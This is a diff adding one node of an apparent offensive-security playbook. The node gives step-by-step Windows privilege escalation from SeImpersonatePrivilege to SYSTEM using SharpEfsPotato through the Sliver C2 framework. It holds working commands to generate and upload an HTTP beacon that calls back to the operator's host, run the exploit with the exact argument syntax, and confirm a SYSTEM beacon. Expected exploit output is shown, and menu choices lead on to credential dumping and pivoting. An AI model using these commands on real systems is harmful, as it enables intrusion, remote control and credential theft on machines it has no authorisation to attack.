@@ -1,0 +1,30 @@
+{
+  "id": "sharp_efs_potato_sliver",
+  "phase": "WINDOWS",
+  "title": "SharpEfsPotato via Sliver — SeImpersonate → SYSTEM",
+  "body": "SeImpersonatePrivilege confirmed? SharpEfsPotato via EfsRpc is one of the cleanest token impersonation paths to SYSTEM. Running it through Sliver's execute-assembly has a critical gotcha: the -- separator is required before any flag-style arguments (-p, -a) or Sliver's CLI parser swallows them and you get a fork/exec syntax error. The technique itself works — the EFS trigger fires, token duplicates, and a new beacon checks in as WORKGROUP\\MACHINE$ (NT AUTHORITY\\SYSTEM).",
+  "cmd": "# ── PREREQUISITE CHECK ───────────────────────────────\n# Confirm SeImpersonatePrivilege is present (Disabled is fine — tools activate it)\nsa-whoami\n# Or via shell:\nwhoami /priv | findstr SeImpersonate\n# Should show: SeImpersonatePrivilege  Impersonate...  Enabled/Disabled\n\n# ── STAGE THE BEACON ─────────────────────────────────\n# Generate a beacon on Kali and upload to target\n# In Sliver console:\ngenerate beacon --http $lhost --os windows --arch amd64 --skip-symbols -N http_beacon\n# Upload to target:\nupload /home/kali/http_beacon.exe C:\\\\Users\\\\user\\\\http_beacon.exe\n\n# ── THE CRITICAL SYNTAX FIX ──────────────────────────\n# WRONG — Sliver's Cobra parser swallows -p as its own flag:\nexecute-assembly SharpEfsPotato.exe --arguments \"-p C:\\\\path\\\\beacon.exe\"\n# Error: fork/exec  C:\\path\\beacon.exe: filename/directory syntax incorrect\n#        (note the leading space — Sliver mangled the path)\n\n# CORRECT — use -- to tell Sliver \"stop parsing here\":\nexecute-assembly /home/kali/hacktrack/c2_sliver/precompiled-binaries/PrivilegeEscalation/Token/SharpEfsPotato.exe -- -p C:\\\\Users\\\\user\\\\http_beacon.exe\n\n# ── FULL COMMAND ─────────────────────────────────────\nexecute-assembly /home/kali/hacktrack/c2_sliver/precompiled-binaries/PrivilegeEscalation/Token/SharpEfsPotato.exe -- -p C:\\\\Users\\\\luiza\\\\http_beacon.exe\n\n# ── EXPECTED OUTPUT ───────────────────────────────────\n# [+] Triggering name pipe access on evil PIPE ...\n# [x] RpcBindingSetAuthInfo failed with status 0x6d3  ← normal, ignore\n# [+] Server connected to our evil RPC pipe\n# [+] Duplicated impersonation token ready for process creation\n# [+] Intercepted and authenticated successfully, launching program\n# [+] Process created, enjoy!\n# [*] Beacon XXXXXXXX http_beacon - x.x.x.x (hostname) - windows/amd64\n\n# ── VERIFY NEW BEACON ─────────────────────────────────\nbeacons\n# Look for: Username = WORKGROUP\\HOSTNAME$  (machine account = SYSTEM)\n# use <new_beacon_id>\nsa-whoami\n# SID S-1-5-18 = NT AUTHORITY\\SYSTEM\n# Mandatory Label\\System Mandatory Level\n\n# ── SHARPEFSPOTATO FLAGS ──────────────────────────────\n# -p  Program to launch (default: cmd.exe — if omitted, spawns cmd silently)\n# -a  Arguments to pass to that program\n# Example with -a:\nexecute-assembly SharpEfsPotato.exe -- -p C:\\\\Windows\\\\System32\\\\cmd.exe -a \"/c whoami > C:\\\\Windows\\\\Temp\\\\out.txt\"",
+  "warn": "The -- separator is mandatory when passing flag-style args (-p, -a) to execute-assembly. Without it, Sliver's argument parser treats -p as its own flag and the path gets mangled with a leading space. Without any args, SharpEfsPotato defaults to launching cmd.exe — process creates successfully but no beacon checks in. This technique requires SeImpersonatePrivilege (present even if Disabled) — common on IIS, service accounts, SQL Server processes.",
+  "choices": [
+    {
+      "label": "Got SYSTEM beacon — dump creds / loot",
+      "next": "windows_creds"
+    },
+    {
+      "label": "Got SYSTEM — grab proof and pivot",
+      "next": "got_root_windows"
+    },
+    {
+      "label": "Beacon not checking in — troubleshoot",
+      "next": "sliver_c2"
+    },
+    {
+      "label": "Try GodPotato / SigmaPotato instead",
+      "next": "token_privs"
+    },
+    {
+      "label": "Back to Sliver C2",
+      "next": "sliver_c2"
+    }
+  ]
+}
